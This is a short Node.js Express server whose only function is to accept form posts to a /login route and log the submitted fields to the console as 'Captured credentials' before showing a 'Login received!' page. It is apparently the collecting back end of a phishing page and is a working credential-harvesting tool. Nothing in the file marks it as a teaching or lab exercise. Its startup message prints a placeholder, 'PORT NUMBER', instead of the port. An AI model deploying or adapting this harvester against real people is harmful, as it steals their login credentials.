const express = require('express');
const bodyParser = require('body-parser');
const app = express();
const PORT = 5500;

app.use(bodyParser.urlencoded({ extended: false }));

app.post('/login', (req, res) => {
  console.log('Captured credentials:', req.body);
  res.send('<h1>Login received!</h1>');
});

app.listen(5500, '0.0.0.0', () => {
    console.log('Server running on http://0.0.0.0:PORT NUMBER');
  });
  